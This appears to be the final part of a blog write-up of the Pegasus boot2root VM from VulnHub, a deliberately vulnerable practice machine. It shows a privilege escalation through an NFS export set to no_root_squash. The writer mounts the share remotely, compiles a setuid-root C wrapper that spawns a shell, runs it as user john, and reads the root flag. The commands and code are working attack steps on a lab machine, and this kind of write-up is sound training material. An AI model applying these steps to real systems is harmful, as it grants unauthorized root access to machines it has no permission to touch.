</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/nfs
</span></code></pre></td></tr></table></div></figure>


<p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/opt/nfs *<span class="o">(</span>rw,sync,crossmnt,no_subtree_check,no_root_squash
</span></code></pre></td></tr></table></div></figure>


<p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>

<p>Over to recrudesce for the last bit of pwning pegasus!</p>

<hr />

<p>Before I continue, lets hear it for barrebas and his exploit dev skills.</p>

<p><img src="http://www.thepoke.co.uk/wp-content/uploads/2013/11/applause-3.gif" alt="" /></p>

<p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
</span><span class='line'>root@kali:~# <span class="nb">cd</span> /mnt/nfs
</span><span class='line'>root@kali:/mnt/nfs# ls -la
</span><span class='line'>total 8
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 03:43 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Dec <span class="m">19</span> 13:09 ..
</span></code></pre></td></tr></table></div></figure>


<p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>

<p>The code for the C wrapper is pretty straight forward</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/mnt/nfs# gcc wrapper.c -m32
</span><span class='line'>root@kali:/mnt/nfs# chmod <span class="m">4777</span> a.out
</span></code></pre></td></tr></table></div></figure>


<p>Which, when executed as user john, drops me to a root shell</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 32
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Dec <span class="m">20</span> 00:17 .
</span><span class='line'>drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 20:51 ..
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root root <span class="m">7160</span> Dec <span class="m">20</span> 00:17 a.out
</span><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>./moo2
</span><span class='line'>./a.out
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat flag</span>
</span><span class='line'>               ,
</span><span class='line'>               <span class="p">|</span><span class="sb">`</span><span class="se">\</span>
</span><span class='line'>              /<span class="s1">&#39;_/_</span>
</span><span class='line'><span class="s1">            ,&#39;</span>_/<span class="se">\_</span>/<span class="se">\_</span>                       ,
</span><span class='line'>          ,<span class="s1">&#39;_/\&#39;_\_,/_                    ,&#39;</span><span class="p">|</span>
</span><span class='line'>        ,<span class="s1">&#39;_/\_&#39;</span>_ <span class="se">\_</span> <span class="se">\_</span>/                _,-<span class="s1">&#39;_/</span>
</span><span class='line'><span class="s1">      ,&#39;</span>_/<span class="s1">&#39;\_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,<span class="se">\ </span>          _,-<span class="s1">&#39;_,-/ \,      Pegasus is one of the best</span>
</span><span class='line'><span class="s1">    ,&#39;</span> /_<span class="se">\ </span>_<span class="s1">&#39;_ \_ \&#39;_,/       __,-&#39;</span>&lt;_,<span class="s1">&#39; _,\_,/      known creatures in Greek</span>
</span><span class='line'><span class="s1">   ( (&#39;</span> <span class="o">)</span><span class="se">\/</span><span class="o">(</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,<span class="se">\ </span>  __--<span class="s1">&#39; _,-_/_,-&#39;</span>,_/ _<span class="se">\ </span>     mythology. He is a winged
</span><span class='line'>    <span class="se">\_</span><span class="sb">`</span><span class="se">\&gt;</span> 6<span class="sb">`</span> <span class="m">7</span>  <span class="se">\&#39;</span>_,/ ,-<span class="s1">&#39; _,-,&#39;</span><span class="se">\,</span>_<span class="s1">&#39;_ \,_/&#39;</span>_,<span class="se">\ </span>      stallion usually depicted
</span><span class='line'>     <span class="se">\/</span>-  _/ <span class="m">7</span> <span class="s1">&#39;/ _,&#39;</span> _/<span class="s1">&#39;\_  \,_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,/         as pure white in color.
</span><span class='line'>      <span class="se">\_</span><span class="s1">&#39;/&gt;   7&#39;</span>_/<span class="s1">&#39; _/&#39;</span> <span class="se">\_</span> <span class="s1">&#39;\,_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,<span class="se">\ </span>         Symbol of wisdom and fame.
</span><span class='line'>        &gt;/  _ ,V  ,&lt;  <span class="se">\_</span>_ <span class="s1">&#39;\,_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,/
</span><span class='line'>      /<span class="s1">&#39;_  ( )_)\/-,&#39;</span>,__ <span class="s1">&#39;\,_&#39;</span>_,<span class="se">\_</span>,<span class="se">\&#39;</span>_<span class="se">\ </span>            Fun fact: Pegasus was also
</span><span class='line'>     <span class="o">(</span> <span class="o">)</span> <span class="se">\_</span> <span class="se">\|</span>_  <span class="sb">`</span><span class="se">\_</span>    <span class="se">\_</span>,/<span class="s1">&#39;\,_&#39;</span>_,/<span class="err">&#39;</span>               a video game system sold in
</span><span class='line'>      <span class="se">\\</span>_  <span class="se">\_\_</span><span class="o">)</span>    <span class="sb">`</span><span class="se">\_</span>                             Poland, Serbia and Bosnia.
</span><span class='line'>       <span class="se">\_</span><span class="o">)</span>   &gt;        <span class="sb">`</span><span class="se">\_</span>                           It was a hardware clone of
</span><span class='line'>            /  <span class="sb">`</span>,      <span class="p">|</span><span class="sb">`</span><span class="se">\_</span>                         the Nintendo Famicom.
</span><span class='line'>           /    <span class="se">\ </span>    / <span class="se">\ </span><span class="sb">`</span><span class="se">\</span>
</span><span class='line'>          /   __/<span class="p">|</span>   /  /  <span class="sb">`</span><span class="se">\</span>
</span><span class='line'>         <span class="o">(</span><span class="sb">`</span>  <span class="o">(</span>   <span class="o">(</span><span class="sb">`</span> <span class="o">(</span>_  <span class="se">\ </span>  /
</span><span class='line'>         /  ,/    <span class="p">|</span>  /  /   <span class="se">\</span>
</span><span class='line'>        / ,/      <span class="p">|</span> /   <span class="se">\ </span>  <span class="sb">`</span><span class="se">\_</span>
</span><span class='line'>      _/_/        <span class="p">|</span>/    /__/,_/
</span><span class='line'>     /_<span class="o">(</span>         /_<span class="o">(</span>
</span><span class='line'>
</span><span class='line'>CONGRATULATIONS! You made it :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
</span><span class='line'>learnt a thing or two <span class="k">while</span> doing it! :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Massive thanks and a big shoutout to @iMulitia <span class="k">for</span> beta-breaking my VM and
</span><span class='line'>providing first review.
</span><span class='line'>
</span><span class='line'>Feel free to hit me up on Twitter @TheKnapsy or at <span class="c">#vulnhub channel on freenode</span>
</span><span class='line'>and leave some feedback, I would love to hear from you!
</span><span class='line'>
</span><span class='line'>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com <span class="k">for</span>
</span><span class='line'>more awesome boot2root VMs!
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-12-19T13:50:49+00:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>